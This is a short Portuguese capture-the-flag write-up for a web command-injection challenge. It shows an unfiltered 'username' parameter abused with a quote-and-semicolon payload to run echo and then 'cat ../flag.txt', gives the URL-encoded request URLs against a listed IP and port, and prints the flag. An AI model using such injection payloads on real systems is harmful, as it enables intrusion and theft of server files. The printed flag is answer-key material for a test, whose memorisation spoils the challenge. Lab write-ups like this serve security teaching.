# **CTF**

## _CMD Injection I_

## Informações

| **Category:** | **Points:** |
| ------------- | ----------- |
| Web           | 500         |

**Descrição:**

> Flag em ../flag.txt.

> http://34.95.239.56:9989/

## Solução

Observando o código vemos que não há nenhum tipo de filtro para o usuário. Podemos injetar comando através da variavel usuario usando ";" para separar cada comando. Fiz um teste com `echo bom dia`. O payload ficou assim `';echo 'bom dia`

Passando para urlencode na url ficamos com:

```
34.95.239.56:9989/?username=%27%3Becho%20%27bom%20dia
```

#### Resposta do servidor:

![](https://i.imgur.com/5GP8N2J.png)

Modificando o payload para capturar a flag podemos usar o comando cat ficando `';cat ../flag.txt;echo 'bom dia`. Usei o echo no final para fechar com as aspas no final do código.

#### Com isso o payload final:

`http://34.95.239.56:9989/?username=%27%3Bcat%20..%2Fflag.txt%3Becho%20%27bom%20dia`

![](https://i.imgur.com/ZtmVDOy.png)

### Flag

> CTF-BR{CMD_iNjEct1ON_B4$ic@}
